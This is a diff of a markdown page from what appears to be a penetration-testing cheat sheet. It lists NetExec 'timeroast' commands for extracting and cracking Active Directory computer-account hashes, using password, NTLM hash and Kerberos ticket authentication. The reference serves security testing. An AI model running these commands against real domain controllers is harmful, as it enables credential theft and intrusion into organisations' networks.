@@ -1,29 +1,43 @@
 ---
 title: "Time Roasting"
-tags: ["NTP", "Hash Cracking", "Time Roasting", "Enumeration", "Domain Controller", "Active Directory", "Windows"]
+tags: ["Active Directory", "Time Roasting", "Domain Controller", "Enumeration", "Hash Cracking", "NTP", "Windows"]
 ---
+
+{{< filter_buttons >}}
 
 ### Time Roasting
 
 {{< tab set1 tab1 >}}nxc{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-```console
-# Anonymous
-nxc smb <DC> -M timeroast
-```
-
-```console
+```console {class="password"}
 # Password
-nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -M timeroast
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -M timeroast
 ```
 
-```console
-# Kerberos
-sudo ntpdate -s <DC_IP> && nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -k -d <DOMAIN> -M timeroast
+```console {class="ntlm"}
+# NTLM
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H '<HASH>' -M timeroast
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --kdcHost <DC> -M timeroast
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H '<HASH>' -k --kdcHost <DC> -M timeroast
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -k --kdcHost <DC> --use-kcache -M timeroast
 ```
 
 {{< /tabcontent >}}
+
+---
 
 ### Hash Crack
 
